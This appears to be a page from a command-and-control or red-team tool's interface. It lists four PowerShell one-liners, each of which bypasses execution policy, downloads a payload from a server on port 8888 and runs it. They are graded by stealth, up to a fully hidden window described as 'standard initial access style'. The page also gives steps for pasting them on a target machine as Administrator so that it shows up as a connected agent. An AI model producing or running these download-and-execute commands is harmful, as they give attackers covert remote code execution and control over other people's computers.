    POWERSHELL AGENT

    Choose an OPSEC level, copy the one-liner, paste into Windows PowerShell. The VM appears as a connected agent.

    AGENT ONE-LINER — SELECT OPSEC LEVEL
    LOWVisible PowerShell window

    Foreground window. The user can see the process. Best for early testing / observing agent behaviour.

    powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"
    MEDIUMNormal console window

    Standard console window. Slightly less obtrusive than LOW, still visible to the user.

    powershell -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"
    HIGHMinimized window

    Console starts minimized. The user sees the process in the taskbar only.

    powershell -NoProfile -WindowStyle Minimized -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"
    CRITICALHidden window (no UI)

    Completely hidden. No window, no taskbar entry. Standard initial access style.

    powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ server_ip }}:8888/payload')"
    How to use:
    1. Click 📋 Copy one-liner on the level you want.
    2. On the target Windows VM, open PowerShell (Run as Administrator for full checks).
    3. Paste the one-liner and press Enter.
    4. Within ~8 seconds, the VM appears in Connected Agents with the computer name.
